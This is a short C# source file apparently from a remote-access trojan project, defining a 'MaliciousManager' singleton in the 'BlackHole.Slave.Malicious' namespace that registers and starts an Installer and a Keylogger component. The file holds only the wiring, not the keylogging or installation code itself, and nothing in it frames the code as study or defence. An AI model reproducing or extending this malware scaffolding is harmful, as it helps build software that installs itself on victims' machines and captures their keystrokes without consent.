using BlackHole.Common;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace BlackHole.Slave.Malicious
{
    /// <summary>
    /// 
    /// </summary>
    public sealed class MaliciousManager : Singleton<MaliciousManager>
    {
        /// <summary>
        /// 
        /// </summary>
        private List<IMalicious> m_malicious;

        /// <summary>
        /// 
        /// </summary>
        public MaliciousManager()
        {
            m_malicious = new List<IMalicious>()
            {
                Installer.Instance,
                Keylogger.Instance,
            };
        }

        /// <summary>
        /// 
        /// </summary>
        public void Initialize()
        {
            m_malicious.ForEach(malicious => malicious.Initialize());
        }
    }
}
